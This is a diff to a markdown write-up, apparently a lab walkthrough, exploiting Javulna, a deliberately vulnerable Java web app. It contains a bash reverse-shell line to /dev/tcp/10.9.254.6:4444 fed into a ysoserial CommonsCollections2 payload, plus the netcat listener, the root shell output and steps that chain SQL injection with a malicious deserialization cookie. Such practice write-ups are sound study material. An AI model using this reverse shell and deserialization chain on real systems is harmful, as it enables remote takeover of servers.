@@ -204,7 +204,28 @@ payload=`echo "bash -i >& /dev/tcp/10.9.254.6/4444 0>&1" | base64 -w0`;java -jar
 
 ### Exploitation
 
-coming soon
+Finally we can start our `netcat` listener:
+
+```
+nc -nvlp 4444
+```
+
+And send the malicious cookie using BurpSuite (to the `rest/movie` endpoint):
+
+<img width="1251" alt="Screenshot 2022-08-10 at 08 41 23" src="https://user-images.githubusercontent.com/42491100/183843626-8b757577-db07-4e18-896f-d790d85d3c03.png">
+
+We now have a reverse shell to the target:
+
+```
+nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [10.9.254.6] from (UNKNOWN) [10.10.0.120] 49636
+root@john-virtual-machine:/home/john/Documents/javulna-master/target# whoami
+whoami
+root
+```
+
+And I'm running Javulna as root... how naughty of me!
 
 ## Steps to Compromise
 
@@ -212,11 +233,11 @@ The steps to compromise the web application are as follows:
 
 - Carry out the SQL Injection vulnerability to revael the user credentials.
 - Log in to the web application.
-- Generate a reverse shell payload for use with `ysoserial`.
-- Generate a Java Deserialization exploit, using the `CommonsCollections4` payload in `ysoserial` (reverse shell).
+- Generate a Java Deserialization exploit, using the `CommonsCollections2` payload in `ysoserial` (reverse shell).
 - Adjust the `USER_AUTHENTICATION_EXTRA_SECURITY` cookie to contain the `ysoserial` payload.
 - Start a local `netcat` listener.
 - Send the malicious cookie to any authenticated endpoint.
+- Enjoy!
 
 ## Full Exploit Code
 
